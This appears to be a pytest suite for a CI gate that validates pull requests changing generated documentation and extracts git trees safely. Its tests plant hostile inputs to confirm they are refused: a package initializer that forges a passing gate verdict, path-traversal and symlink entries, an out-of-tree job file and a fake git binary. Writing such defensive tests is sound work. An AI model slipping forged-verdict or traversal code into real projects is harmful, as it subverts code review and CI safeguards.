    if RENDERER_HERE:
        root, moved = inventory_repo
        sentinel = root / "UNTRUSTED_PACKAGE_EXECUTED"
        cicd_row = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]", 1)
        on_base(root, {CATALOG: cicd_row})
        initializer = (
            "import os, sys\n"
            "if '--pr' in sys.argv:\n"
            f"    open({str(sentinel)!r}, 'w').write('executed')\n"
            "    print('spec gate ok: forged by package startup', flush=True)\n"
            "    os._exit(0)\n"
        )
        change(root, BRANCH, {**moved, "scripts/__init__.py": initializer})
        base, head = base_and_head(root)
        _git(root, "checkout", "-q", "-f", "main")
        attempted = gate(root, "--pr", base, head, PR_HEAD_REF=BRANCH, **DOCS_OK)
        assert attempted.returncode == 1 and "belong to FEAT-CICD-001" in attempted.stdout, attempted.stdout
        assert RULE in attempted.stdout and "which decide the render" in attempted.stdout, attempted.stdout
        assert not sentinel.exists(), "HEAD initializer executed before a trusted verdict"
        # The refused first stage cannot become BASE. From the unchanged real
        # BASE, the otherwise IDENTICAL generated movement is still accepted.
        change(root, BRANCH, moved)
        base, head = base_and_head(root)
        _git(root, "checkout", "-q", "-f", "main")
        clean = gate(root, "--pr", base, head, PR_HEAD_REF=BRANCH, **DOCS_OK)
        assert clean.returncode == 0, clean.stdout + clean.stderr
        assert not sentinel.exists()


def test_the_refusal_names_the_inventory_allowance(repo):
    """FEAT-CICD-001 spec, the allowance (done_when[7]): the refusal for every other docs/product/ path names the
    re-rendered inventory blocks as an allowed change and cites REQ-GOV-004."""
    r = pr(repo, BRANCH, {**CODE, "docs/product/13-ROADMAP.md": "# Roadmap\n"}, **DOCS_OK)
    assert r.returncode == 1 and "13-ROADMAP.md changes in this feature change" in r.stdout \
        and "re-rendered by scripts/maintenance/doc_inventory.py (REQ-GOV-004)" in r.stdout, r.stdout
    assert "existing fixed renderer-owned count/as-of substitutions" in r.stdout, r.stdout
    assert all(name in r.stdout for name in ('05-a-ARCHITECTURE.md', '05-c-DATA_DEPENDENCIES.md', '05-e-API.md')), r.stdout


def test_render_inputs_and_the_documents_themselves_stay_put(inventory_repo):
    """FEAT-CICD-001 spec, "Render inputs unchanged" and "Same file" (done_when[1]): each case differs from the
    #1366-shaped head (moved) in one condition, and each is refused citing REQ-GOV-004."""
    if RENDERER_HERE:
        root, moved = inventory_repo
        inputs, same = "which decide the render", "is deleted, renamed or changes file mode"
        cases = {   # name: (files, then, fragment); each differs from the #1366 head in one condition
            "parent scripts initializer changes": ({**moved, "scripts/__init__.py": "# touched\n"}, None, inputs),
            "maintenance initializer changes": ({**moved, "scripts/maintenance/__init__.py": "# touched\n"}, None, inputs),
            "doc_inventory.py changes": ({**moved, "scripts/maintenance/doc_inventory.py": (REPO / "scripts/maintenance/doc_inventory.py").read_text(encoding="utf-8") + "# touched\n"}, None, inputs),
            "check_generated_docs.py changes": ({**moved, "scripts/maintenance/check_generated_docs.py": (REPO / "scripts/maintenance/check_generated_docs.py").read_text(encoding="utf-8") + "# touched\n"}, None, inputs),
            "the docs test changes": ({**moved, "tests/scripts/test_check_generated_docs.py": "# touched\n"}, None, inputs),
            "the snapshot changes": ({**moved, SNAPSHOT_FILE: (REPO / SNAPSHOT_FILE).read_text(encoding="utf-8") + "\n"}, None, inputs),
            "05-e deleted": ({**moved, API_DOC: None}, None, same),
            "05-e renamed": ({**moved, API_DOC: None, f"{INFRA}/05-e-API-v2.md": moved[API_DOC]}, None, same),
            "05-e made executable": (moved, lambda r: (r / API_DOC).chmod(0o755), same),
        }
        outcomes = {k: pr(root, BRANCH, f, then=t, **DOCS_OK) for k, (f, t, _) in cases.items()}
        missed = {k: r.stdout[-400:] for k, r in outcomes.items() if not refused(r, cases[k][2])}
        assert missed == {}, missed


def test_only_inventory_block_bodies_change(inventory_repo):
    """FEAT-CICD-001 spec, "Exact markers" and "Only block bodies change" (done_when[1]): with every block body set
    aside, 05-e must equal main's byte for byte, on exact marker lines in main's order. Each case is the #1366 head
    with one change, and each is refused citing REQ-GOV-004 and naming its condition."""
    if RENDERER_HERE:
        root, moved = inventory_repo
        t = moved[API_DOC]
        rs, re_, ts = "<!-- inventory:routes:start -->", "<!-- inventory:routes:end -->", "<!-- inventory:routers:start -->"
        routers = t[t.index(ts):t.index("<!-- inventory:routers:end -->") + len("<!-- inventory:routers:end -->\n")]
        routes = t[t.index(rs):t.index(re_) + len(re_) + 1]
        n = t.split("\n").index("Prose after routes.") + 1
        first_body = t.index("\n", t.index(rs) + len(rs) + 1)          # the newline ending the routes block's first body line
        cases = {
            "a byte outside the blocks": (edit(t, "Prose after routes.", "Prose after routes!"), f"changes line {n} outside its inventory blocks"),
            "CRLF throughout": (t.replace("\n", "\r\n"), "carriage return"),
            "a CRLF inside a block body": (t[:first_body] + "\r" + t[first_body:], "carriage return"),
            "a marker added": (t + re_ + "\n", "marker lines"),
            "a marker removed": (edit(t, "<!-- inventory:routers:end -->\n", ""), "marker lines"),
            "a block moved": (edit(t.replace(routes, ""), ts, routes + ts), "marker lines"),
            "a marker renamed": (t.replace("inventory:routes:", "inventory:paths:"), "marker lines"),
            "a marker re-spaced": (edit(t, rs, "<!--  inventory:routes:start -->"), "marker lines"),
            "a block repeated": (edit(t, routers, routers + routers), "marker lines"),
            "a name 05-e does not carry": (edit(t, "Prose after routes.", "Prose after routes.\n<!-- inventory:jobs:start -->"), "marker lines"),
        }
        outcomes = {k: pr(root, BRANCH, {**moved, API_DOC: text}, **DOCS_OK) for k, (text, _) in cases.items()}
        missed = {k: r.stdout[-400:] for k, r in outcomes.items() if not refused(r, cases[k][1])}
        assert missed == {}, missed


# A route whose path holds an escape sequence written as source text: main's renderer renders each escape into one
# 05-a and two 05-e block lines (verified 2026-10-11), so the bytes come from the fixture tree's own rendered text.
ROUTE = '\n\n@app.get("/api/zz{}")\ndef zz_probe():\n    """Probe."""\n    return {{}}\n'


def test_a_block_carries_only_bytes_the_docs_test_sees(inventory_repo):
    """FEAT-CICD-001 spec, "Clean bytes" (done_when[1]): the docs test reads with read_text(), so a NUL, U+0085,
    U+2028 or U+2029 inside a block body passes it unseen. Rendered from the route path, so only this rule refuses."""
    if RENDERER_HERE:
        root, moved = inventory_repo
        outcomes = {esc: pr(root, BRANCH, {MAIN_PY: moved_main() + ROUTE.format(esc)}, then=render, **DOCS_OK)
                    for esc in ("\\x00", "\\x85", "\\u2028", "\\u2029")}   # rendered from the route path, so only this rule refuses
        missed = {k: r.stdout[-400:] for k, r in outcomes.items() if not refused(r, "carries a carriage return, NUL, U+0085, U+2028 or U+2029")}
        assert missed == {}, missed


def mktree(root: Path, lines: str) -> str:
    """The id of the tree `git mktree` builds from ls-tree-format `lines`."""
    return subprocess.run(["git", "mktree"], input=lines, cwd=root, capture_output=True, text=True, check=True).stdout.strip()


def spliced(root: Path, entry: str) -> tuple[str, str]:
    """(base, head) rebuilt with one more root entry, `vendor`, a tree made from the single ls-tree line `entry`, in
    both commits. The head commit is parented on the base, so the entry sits in the head tree and never in the diff.
    Called after pr(), on its HEAD."""
    vendor = mktree(root, entry + "\n")
    shas: list[str] = []
    for rev in ("base", "HEAD"):
        tree = mktree(root, _git(root, "ls-tree", f"{rev}^{{tree}}") + f"\n040000 tree {vendor}\tvendor\n")
        parent = shas[-1] if shas else _git(root, "rev-parse", "base")
        shas.append(_git(root, "commit-tree", tree, "-p", parent, "-m", f"{rev} with vendor"))
    return shas[0], shas[1]


def test_the_head_tree_is_plain_files(inventory_repo):
    """FEAT-CICD-001 spec, "Exact render", the tree (done_when[1]): the render reads the head tree written out as plain
    files, so a .gitattributes that changes bytes on export, a symbolic link, a submodule and a path component that
    is empty, '.', '..' or '.git' (in any case) are each refused before anything is written."""
    if RENDERER_HERE:
        root, moved = inventory_repo
        outcomes = {f".gitattributes {a}": (pr(root, BRANCH, {**moved, ".gitattributes": f"{API_DOC} {a}\n"}, **DOCS_OK), "a .gitattributes")
                    for a in ("export-subst", "eol=crlf", "ident")}
        blob = subprocess.run(["git", "hash-object", "-w", "--stdin"], input="../gcp/schema.sql", cwd=root, capture_output=True, text=True, check=True).stdout.strip()
        x = mktree(root, f"100644 blob {blob}\tx\n")
        entries = {"a symbolic link": (f"120000 blob {blob}\tlink", "a symbolic link"),
                   "a submodule": (f"160000 commit {_git(root, 'rev-parse', 'base')}\tsub", "a submodule"),
                   "an empty component": (f"040000 tree {x}\t", "cannot be listed"),
                   **{f"component {c}": (f"040000 tree {x}\t{c}", "a path component") for c in (".", "..", ".git", ".GIT")},
                   # (red-team round 1: a name the filesystem cannot hold crashed the gate with a traceback)
                   "a 256-byte name": (f"100644 blob {blob}\t{'x' * 256}", "cannot be written out")}
        change(root, BRANCH, moved)   # the #1366 head, which each splice extends
        for name, (entry, fragment) in entries.items():
            b, h = spliced(root, entry)
            outcomes[name] = (gate(root, "--pr", b, h, PR_HEAD_REF=BRANCH, **DOCS_OK), fragment)
        missed = {k: r.stdout[-400:] for k, (r, fragment) in outcomes.items() if not refused(r, fragment)}
        assert missed == {}, missed


def test_materialize_writes_inside_its_directory_only(repo, tmp_path_factory):
    """FEAT-CICD-001 spec, "Exact render" (done_when[1]): every resolved path stays inside the directory before it is
    written, and each blob is written byte for byte."""
    sg = load_gate(repo)
    oid, out = _git(repo, "rev-parse", "base:lib/model.py"), tmp_path_factory.mktemp("tree")
    with pytest.raises(ValueError, match="outside"):
        sg.materialize([("100644", oid, "../escape.py")], out)
    with pytest.raises(ValueError, match="outside"):   # every path is checked before anything is written (pass 31 R4 F2)
        sg.materialize([("100644", oid, "lib/first.py"), ("100644", oid, "../escape.py")], out)
    assert not (out / "lib").exists()
    with pytest.raises(ValueError, match="outside"):   # a sibling sharing the directory's name as a prefix (pass 32 R4 F1)
        sg.materialize([("100644", oid, f"../{out.name}x/escape.py")], out)
    assert not (out.parent / f"{out.name}x").exists()
    sg.materialize([("100644", oid, "lib/model.py")], out)
    assert (out / "lib/model.py").read_bytes() == b"DECISION = 'size'\n" and not (out.parent / "escape.py").exists()



WRITE_FAIL_RUNNER = r"""
import importlib.util,json,pathlib,sys
s=importlib.util.spec_from_file_location('write_fail_gate',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
big,into=sys.argv[2],pathlib.Path(sys.argv[3]);started,real=[],m.subprocess.Popen
m.subprocess.Popen=lambda *a,**kw:started.append(real(*a,**kw)) or started[-1]
try:
    m.materialize([('100644',big,'a/'+'x'*256),('100644',big,'after.bin')],into);out={'raised':None}
except OSError as e:
    out={'raised':type(e).__name__,'errno':e.errno}
out['started']=len(started);out['returncode']=started[0].returncode if started else None
print(json.dumps(out))
"""


def test_materialize_ends_git_when_a_write_fails(repo, tmp_path):
    """An error that is not a refusal (a name the filesystem cannot hold) still ends and reaps git before it
    propagates, with git's answer to a later blob still unread in the pipe (#1700 pass 33 R4 F2). It runs in a child
    with a time limit, so a cleanup that waits for git without ending it fails the test instead of hanging the suite
    (pass 34 R4 F1, as QUAL2 R4 F2 for REAL_RUNNER)."""
    (tmp_path / "big").write_bytes(b"z" * (400 * 1024))
    big = _git(repo, "hash-object", "-w", str(tmp_path / "big")).strip()
    r = subprocess.run([sys.executable, "-c", WRITE_FAIL_RUNNER, str(repo / "scripts/gate/spec_gate.py"), big,
                        str(tmp_path / "into")], capture_output=True, text=True, timeout=30)
    assert r.returncode == 0, r.stdout + r.stderr
    out = json.loads(r.stdout)
    assert out["raised"] == "OSError" and out["errno"] == errno.ENAMETOOLONG, out
    assert out["started"] == 1 and out["returncode"] is not None, out

def test_materialize_streams_exact_bytes_one_blob_at_a_time(repo, tmp_path):
    """FEAT-CICD-001 "Exact render" (done_when[1]) with the streamed batch: blobs across the 1 MiB chunk boundary,
    binary with newlines, arrive byte for byte; a missing object fails; the reader never holds a whole blob."""
    sg = load_gate(repo)
    src = tmp_path / "blobs"
    src.mkdir()
    pattern = bytes(range(256)) + b"\n\r\n\0"
    sizes = [0, 1, (1 << 20) - 1, 1 << 20, (1 << 20) + 1, 3 * (1 << 20) + 7]
    entries, wanted = [], {}
    for n, size in enumerate(sizes):
        body = (pattern * (size // len(pattern) + 1))[:size]
        (src / f"b{n}").write_bytes(body)
        oid = _git(repo, "hash-object", "-w", str(src / f"b{n}")).strip()
        entries.append(("100644", oid, f"d{n % 2}/b{n}.bin"))
        wanted[f"d{n % 2}/b{n}.bin"] = body
    out = tmp_path / "streamed"
    out.mkdir()
    sg.materialize(entries, out)
    assert {p: (out / p).read_bytes() == body for p, body in wanted.items()} == {p: True for p in wanted}
    (tmp_path / "missing").mkdir()
    with pytest.raises(sg.GitFailed):
        sg.materialize([*entries[:2], ("100644", "0" * 40, "missing.bin")], tmp_path / "missing")
    # Peak RSS of a fresh process materializing one 32 MiB blob grows by far less than the blob.
    big = src / "big"
    with open(big, "wb") as f:
        for _ in range(32):
            f.write((pattern * 4100)[:1 << 20])
    oid = _git(repo, "hash-object", "-w", str(big)).strip()
    big.unlink()
    # VmHWM, not ru_maxrss: Linux carries ru_maxrss across exec from the forking pytest process.
    probe = ("import importlib.util,json,pathlib,re,sys;"
             "hwm=lambda:int(re.search(r'VmHWM:\\s+(\\d+)',open('/proc/self/status').read()).group(1));"
             "s=importlib.util.spec_from_file_location('streamed_gate',sys.argv[1]);m=importlib.util.module_from_spec(s);"
             "sys.modules[s.name]=m;s.loader.exec_module(m);before=hwm();"
             "m.materialize([('100644',sys.argv[2],'big.bin')],pathlib.Path(sys.argv[3]));"
             "print(json.dumps({'before_kib':before,'grew_kib':hwm()-before,"
             "'size':(pathlib.Path(sys.argv[3])/'big.bin').stat().st_size}))")
    into = tmp_path / "big"
    into.mkdir()
    r = subprocess.run([sys.executable, "-c", probe, str(repo / "scripts/gate/spec_gate.py"), oid, str(into)],
                       capture_output=True, text=True, timeout=60)
    assert r.returncode == 0, r.stdout + r.stderr
    measured = json.loads(r.stdout)
    assert measured["size"] == 32 << 20 and measured["grew_kib"] < 8 * 1024, measured
    (into / "big.bin").unlink()


# One batch answer per case, from a stand-in `git` on PATH: (stdout bytes, exit status, words the refusal names).
def test_materialize_accepts_a_sha256_repository(tmp_path):
    """BATCH_HEADER's 64-hex branch: real git in a SHA-256 repository answers with 64-hex ids, and blobs of size 0,
    1 and 1 MiB + 3 arrive byte for byte (#1700 pass 23 R4 F2)."""
    repo = tmp_path / "sha256"
    init = subprocess.run(["git", "init", "-q", "--object-format=sha256", str(repo)], capture_output=True, text=True)
    assert init.returncode == 0, init.stderr   # git 2.29 and later; the hosted runners carry newer
    blobs = {"empty": b"", "one": b"\n", "big.bin": bytes(range(256)) * 4096 + b"\0\n\r"}
    entries = []
    for name, data in blobs.items():
        (tmp_path / name).write_bytes(data)
        oid = _git(repo, "hash-object", "-w", str(tmp_path / name)).strip()
        assert len(oid) == 64, oid
        entries.append(("100644", oid, f"d/{name}"))
    runner = ("import importlib.util,pathlib,sys;s=importlib.util.spec_from_file_location('g',sys.argv[1]);"
              "m=importlib.util.module_from_spec(s);sys.modules['g']=m;s.loader.exec_module(m);m.ROOT=pathlib.Path(sys.argv[2]);"
              "import json;m.materialize([tuple(e) for e in json.loads(sys.argv[3])],pathlib.Path(sys.argv[4]))")
    into = tmp_path / "into"
    into.mkdir()
    r = subprocess.run([sys.executable, "-c", runner, str(REPO / "scripts/gate/spec_gate.py"), str(repo),
                        json.dumps(entries), str(into)], capture_output=True, text=True, timeout=60)
    assert r.returncode == 0, r.stdout + r.stderr
    assert {name: (into / "d" / name).read_bytes() for name in blobs} == blobs


FAKE_OID = "1" * 40
FAKE_BATCH = {
    "short read inside the blob": (f"{FAKE_OID} blob 10\n".encode() + b"abcd", 0, ["ended inside x.bin", FAKE_OID]),
    "header without its line end": (f"{FAKE_OID} blob 12".encode(), 0, ["answered", "blob 12", "x.bin"]),
    "another object type": (f"{FAKE_OID} tree 4\nabcd\n".encode(), 0, ["answered", "tree 4", "x.bin"]),
    "another object id": (f"{'2' * 40} blob 4\nabcd\n".encode(), 0, ["answered", "2" * 40, "x.bin"]),
    "no separator": (f"{FAKE_OID} blob 4\nabcdX".encode(), 0, ["no separator after x.bin", FAKE_OID]),
    "nonzero exit after a complete answer": (f"{FAKE_OID} blob 4\nabcd\n".encode(), 3, ["failed (3)"]),
    "killed by a signal after a complete answer": (f"{FAKE_OID} blob 4\nabcd\n".encode(), -9, ["failed (-9)"]),   # pass 32 R4 F2
    "no separator, clean exit": (f"{FAKE_OID} blob 4\nabcd".encode(), 0, ["no separator after x.bin", FAKE_OID]),   # pass 34 R4 F2
    "carriage return for a separator": (f"{FAKE_OID} blob 4\nabcd\r".encode(), 0, ["no separator after x.bin", FAKE_OID]),
    "size not a number": (f"{FAKE_OID} blob 12abc\n".encode() + b"z" * 13, 0, ["answered", "12abc", "x.bin"]),
    "negative size": (f"{FAKE_OID} blob -1\n".encode() + b"z" * 4096, 0, ["answered", "blob -1", "x.bin"]),
    "size with an underscore": (f"{FAKE_OID} blob 1_2\n".encode() + b"z" * 12 + b"\n", 0, ["answered", "1_2", "x.bin"]),
    "size with a sign": (f"{FAKE_OID} blob +4\nabcd\n".encode(), 0, ["answered", "+4", "x.bin"]),
    "output after the last object": (f"{FAKE_OID} blob 4\nabcd\nextra\n".encode(), 0, ["after the last of 1 object"]),
    # The header is matched whole: exactly three fields, one space between them, no leading zero, one line feed and
    # at most 19 digits, so a size too long for int() is a GitFailed naming the entry (#1700 pass 22 R4 F2, F3).
    "four fields": (f"{FAKE_OID} blob 4 extra\nabcd\n".encode(), 0, ["answered", "extra", "x.bin"]),
    "two fields": (f"{FAKE_OID} blob\n".encode(), 0, ["answered", "blob", "x.bin"]),
    "carriage return before the line end": (f"{FAKE_OID} blob 4\r\nabcd\n".encode(), 0, ["answered", "x.bin"]),
    "tab between fields": (f"{FAKE_OID}\tblob 4\nabcd\n".encode(), 0, ["answered", "x.bin"]),
    "doubled space": (f"{FAKE_OID} blob  4\nabcd\n".encode(), 0, ["answered", "x.bin"]),
    "leading zero": (f"{FAKE_OID} blob 04\nabcd\n".encode(), 0, ["answered", "04", "x.bin"]),
    "text before the id": (f"x{FAKE_OID} blob 4\nabcd\n".encode(), 0, ["answered", "x.bin"]),   # pass 31 R4 F1: the match is anchored at both ends
    "size of 5000 digits": (f"{FAKE_OID} blob {'9' * 5000}\n".encode(), 0, ["answered", "x.bin", FAKE_OID]),
    # A header with no line end is read only up to its bound, with output still pending (#1700 pass 22 R4 F1).
    "overlong header, output pending": (f"{FAKE_OID} blob ".encode() + b"1" * 4096, 0,
                                        ["answered", f"'{FAKE_OID} blob {'1' * 20}'", "x.bin", FAKE_OID]),
    # The longest valid header, a 19-digit size, is read whole and accepted, so the blob read is what ends (pass 23 R4 F1).
    "a 19-digit size": (f"{FAKE_OID} blob {'9' * 19}\n".encode() + b"ab", 0, ["ended inside x.bin", FAKE_OID]),
    # An answer that ends early reports git's own exit status and stderr, whichever check sees the end (QUAL2 R4 F1).
    "early end: no answer": (b"", 128, ["failed (128)", "fatal: boom"]),
    "early end: a megabyte of stderr": (b"", 128, ["failed (128)", "fatal: boom"]),
    "early end: inside the header": (f"{FAKE_OID} blo".encode(), 128, ["failed (128)", "fatal: boom"]),
    "early end: a header one byte short of its bound": (f"{FAKE_OID} blob {'9' * 19}".encode(), 128,
                                                        ["failed (128)", "fatal: boom"]),
    "early end: inside the blob": (f"{FAKE_OID} blob 10\n".encode() + b"abcd", 128, ["failed (128)", "fatal: boom"]),
    "early end: before the separator": (f"{FAKE_OID} blob 4\nabcd".encode(), 128, ["failed (128)", "fatal: boom"]),
    # With more than a pipe's 64 KiB still to write, a wrong separator or trailing output is named before git is
    # ended; ending it first by closing the pipe would report its broken pipe instead (QUAL2 R4 F1).
    "wrong separator, output pending": (f"{FAKE_OID} blob 4\nabcdX".encode(), 0, ["no separator after x.bin", FAKE_OID]),
    "output after the last object, output pending": (f"{FAKE_OID} blob 4\nabcd\nextra".encode(), 0,
                                                      ["after the last of 1 object"]),
}
# Per case, what the stand-in git does besides its answer: bytes it then keeps writing, and its stderr.
FAKE_BATCH_EXTRA = {case: (256 * 1024 if "pending" in case else 0, "fatal: boom\n" if case.startswith("early end") else "")
                    for case in FAKE_BATCH}
FAKE_BATCH_PAD = {"early end: a megabyte of stderr": 1 << 20}   # bytes of stderr written after the case's own
FAKE_BATCH_BOUNDED = {"early end: a megabyte of stderr": 4096 + 200, "overlong header, output pending": 200 + 66,
                      "size of 5000 digits": 200 + 66}   # most characters each refusal may hold
FAKE_RUNNER = r"""
import importlib.util,json,os,pathlib,sys
s=importlib.util.spec_from_file_location('fake_batch_gate',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
work,result=pathlib.Path(sys.argv[2]),{}
for name in sorted(os.listdir(work/'answers')):
    os.environ['FAKE_GIT_ANSWER']=str(work/'answers'/name);os.environ['FAKE_GIT_EXIT']=(work/'exits'/name).read_text()
    os.environ['FAKE_GIT_TAIL']=(work/'tails'/name).read_text();os.environ['FAKE_GIT_STDERR']=(work/'stderrs'/name).read_text()
    os.environ['FAKE_GIT_PAD']=(work/'pads'/name).read_text()
    into=work/'into'/name;into.mkdir(parents=True)
    try:
        m.materialize([('100644','1'*40,'x.bin')],into);result[name]=['accepted','']
    except Exception as e:
        result[name]=[type(e).__name__,str(e)]
print(json.dumps(result))
"""
REAL_RUNNER = r"""
import importlib.util,json,pathlib,sys
s=importlib.util.spec_from_file_location('real_batch_gate',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
result=[]
for first,big,into in json.loads(sys.argv[2]):
    try:
        m.materialize([tuple(first),('100644',big,'after.bin')],pathlib.Path(into));result.append(['accepted',''])
    except Exception as e:
        result.append([type(e).__name__,str(e)])
print(json.dumps(result))
"""


def test_materialize_names_the_refused_entry_and_checks_every_field(repo, tmp_path):
    """FEAT-CICD-001 "Exact render" (done_when[1]) with the streamed batch: a refusal names the entry it refuses even
    when git still has output to write (QUAL1 R1 F1); the size must be a plain decimal and nothing may follow the
    last object (QUAL1 R4 F4); each header, length, separator and exit check has a case only it refuses (R4 F5)."""
    sg = load_gate(repo)
    src = tmp_path / "blobs"
    src.mkdir()
    (src / "big").write_bytes(b"\n\0" * (128 * 1024))   # 256 KiB: more than a pipe holds, so git is still writing
    big = _git(repo, "hash-object", "-w", str(src / "big")).strip()
    tree = _git(repo, "rev-parse", "HEAD^{tree}").strip()
    real = ((("100644", "0" * 40, "m.bin"), ["missing", "m.bin", "0" * 40]),
            (("100644", tree, "t.bin"), ["tree", "t.bin", tree]))
    cases = []
    for first, _words in real:
        into = tmp_path / f"real-{first[2]}"
        into.mkdir()
        cases.append([list(first), big, str(into)])
    # Real git runs in a separate process with a time limit: waiting for git before ending it, while git is blocked
    # writing the rest of a 256 KiB blob, would otherwise hang the suite instead of failing it (QUAL2 R4 F2).
    r = subprocess.run([sys.executable, "-c", REAL_RUNNER, str(repo / "scripts/gate/spec_gate.py"), json.dumps(cases)],
                       capture_output=True, text=True, timeout=60)
    assert r.returncode == 0, r.stdout + r.stderr
    for (kind, message), (_first, words) in zip(json.loads(r.stdout), real):
        assert kind == "GitFailed" and all(w in message for w in words), message
    fake = tmp_path / "fakebin"
    fake.mkdir()
    (fake / "git").write_text(f"#!{sys.executable}\nimport os,sys\n"
                              "try:\n"
                              " sys.stdout.buffer.write(open(os.environ['FAKE_GIT_ANSWER'],'rb').read());sys.stdout.flush()\n"
                              " t=memoryview(b'z'*int(os.environ['FAKE_GIT_TAIL']))\n"
                              # Written one write after another until done, so a write after the reader closed its
                              # end reports the broken pipe. Real git dies of SIGPIPE there (rc -13); Python ignores
                              # SIGPIPE, so this stand-in gets BrokenPipeError and exits 141, and no assertion
                              # depends on which. One buffered write was measured returning without error there, so
                              # the stand-in exited 0 and a gate that closed the pipe first still read as the cause
                              # (X3a, 2026-11-03; wording QUAL3 R4 F1).
                              " while t:t=t[os.write(1,t):]\n"
                              "except BrokenPipeError:\n"
                              " sys.stderr.write('fake-git: broken pipe\\n');sys.stderr.flush();os._exit(141)\n"
                              "sys.stderr.write(os.environ['FAKE_GIT_STDERR']+'e'*int(os.environ['FAKE_GIT_PAD']));sys.stderr.flush()\n"
                              "e=int(os.environ['FAKE_GIT_EXIT'])\n"
                              "if e<0:os.kill(os.getpid(),-e)   # a negative status is a signal the stand-in sends itself\n"
                              "sys.exit(e)\n")
    (fake / "git").chmod(0o755)
    work = tmp_path / "fake"
    for sub in ("answers", "exits", "tails", "stderrs", "pads", "into"):
        (work / sub).mkdir(parents=True)
    for n, (case, (answer, status, _words)) in enumerate(FAKE_BATCH.items()):
        (work / "answers" / f"case{n:02d}").write_bytes(answer)
        (work / "exits" / f"case{n:02d}").write_text(str(status))
        (work / "tails" / f"case{n:02d}").write_text(str(FAKE_BATCH_EXTRA[case][0]))
        (work / "stderrs" / f"case{n:02d}").write_text(FAKE_BATCH_EXTRA[case][1])
        (work / "pads" / f"case{n:02d}").write_text(str(FAKE_BATCH_PAD.get(case, 0)))
    # A separate process with a time limit: a reader that stops checking for a short read loops forever.
    r = subprocess.run([sys.executable, "-c", FAKE_RUNNER, str(repo / "scripts/gate/spec_gate.py"), str(work)],
                       capture_output=True, text=True, timeout=60,
                       env={**os.environ, "PATH": f"{fake}{os.pathsep}{os.environ['PATH']}"})
    assert r.returncode == 0, r.stdout + r.stderr
    seen = json.loads(r.stdout)
    wrong = {case: seen[f"case{n:02d}"] for n, (case, (_a, _s, words)) in enumerate(FAKE_BATCH.items())
             if seen[f"case{n:02d}"][0] != "GitFailed" or not all(w in seen[f"case{n:02d}"][1] for w in words)}
    assert wrong == {}, wrong
    cases = list(FAKE_BATCH)
    unbounded = {case: len(seen[f"case{cases.index(case):02d}"][1]) for case, most in FAKE_BATCH_BOUNDED.items()
                 if len(seen[f"case{cases.index(case):02d}"][1]) > most}
    assert unbounded == {}, unbounded
    # The stderr bound is exactly 4 KiB: "fatal: boom\n" and then 4084 of the megabyte's e's (pass 24 R4 F1).
    shown = seen[f"case{cases.index('early end: a megabyte of stderr'):02d}"][1]
    assert shown.endswith("fatal: boom\n" + "e" * 4084) and not shown.endswith("e" * 4085), shown[-80:]

# A deploy.sh job whose --args names its entrypoint: the renderer reads that file's first docstring line. Verified on
# 2026-10-11: with an absolute path the fence exits 86, and with gcp/evil_job.py the render opens nothing outside.
JOB = "\ndeploy_evil_job() {{\n    gcloud run jobs deploy evil-job \\\n        --command python3 \\\n        --args {}\n}}\n"


def test_a_feature_change_carries_its_re_rendered_inventory_blocks(inventory_repo):
    """FEAT-CICD-001 spec, the allowance (done_when[0]): a feature branch that adds four lines near the top of
    platform/api/main.py, as stocks#1366 did, passes the PR-mode gate carrying the three documents' re-rendered
    blocks and its own catalog and traceability records."""
    if RENDERER_HERE:
        root, moved = inventory_repo
        own = edit(CATALOG_TEXT, "### FEAT-MODEL-001\n\n- Status: Production", "### FEAT-MODEL-001\n\n- Status: Production\n- Note: cited lines moved")
        r = pr(root, BRANCH, {**moved, CATALOG: own, TRACEABILITY: TRACE_TEXT + "- #7\n"}, **DOCS_OK)
        changed = set(_git(root, "diff", "--name-only", "base", "HEAD").splitlines())
        assert r.returncode == 0 and changed == {MAIN_PY, *GENERATED, CATALOG, TRACEABILITY}, r.stdout + r.stderr


def test_a_block_must_equal_mains_render(inventory_repo):
    """FEAT-CICD-001 spec, "Exact render" (done_when[1]): a hand-edited row is refused with the first difference and
    the exact re-render command, and a renderer that fails on the pull request's files refuses with its exception
    line rather than passing, reporting a difference, or crashing the gate."""
    if RENDERER_HERE:
        root, moved = inventory_repo
        hand = pr(root, BRANCH, {**moved, API_DOC: edit(moved[API_DOC], "Liveness probe:", "Liveness probe, hand-edited:")}, **DOCS_OK)
        broken = pr(root, BRANCH, {**moved, MAIN_PY: moved_main() + "\ndef broken(:\n"}, **DOCS_OK)
        # (red-team round 1: the docs test's block pattern ends at the first end marker even mid-line, so main's
        # differing_blocks read the block as ending there and passed the hand-written row after it)
        end = "\n<!-- inventory:routes:end -->"
        behind = pr(root, BRANCH, {**moved, API_DOC: edit(moved[API_DOC], end, end + " (hand)\n| `GET` | `/api/hand-written` | x | not rendered |" + end)}, **DOCS_OK)
        # (red-team round 2: a blank line added at a block's end was refused as "first difference: the same lines")
        blank = pr(root, BRANCH, {**moved, API_DOC: edit(moved[API_DOC], end, "\n" + end)}, **DOCS_OK)
        missed = [k for k, ok in {
            "hand edit": refused(hand, "differs from main's render") and f"--restore {API_DOC}" in hand.stdout and SNAPSHOT_FILE in hand.stdout,
            "a hand row behind a line that begins with the end marker": refused(behind, "differs from main's render"),
            "a blank line at a block's end, named": refused(blank, "differs from main's render") and "-'' +'<missing>'" in blank.stdout,
            "renderer failure": refused(broken, "renderer failed") and "SyntaxError" in broken.stdout and "Traceback" not in broken.stderr,
        }.items() if not ok]
        assert missed == [], hand.stdout + broken.stdout + broken.stderr + behind.stdout + blank.stdout


def test_the_render_reads_only_the_pull_requests_files(inventory_repo, tmp_path_factory):
    """FEAT-CICD-001 spec, "Exact render" (done_when[1]): a render that opens a file outside the materialized tree
    (a job entrypoint given as an absolute path) is refused and names the file; the same job inside the tree passes."""
    if RENDERER_HERE:
        root, moved = inventory_repo
        outside = tmp_path_factory.mktemp("outside") / "evil_job.py"
        outside.write_text('"""A job entrypoint outside the tree."""\n', encoding="utf-8")
        deploy = RENDER_SOURCE["gcp/deploy.sh"]
        escaped = pr(root, BRANCH, {MAIN_PY: moved_main(), "gcp/deploy.sh": deploy + JOB.format(outside)}, then=render, **DOCS_OK)
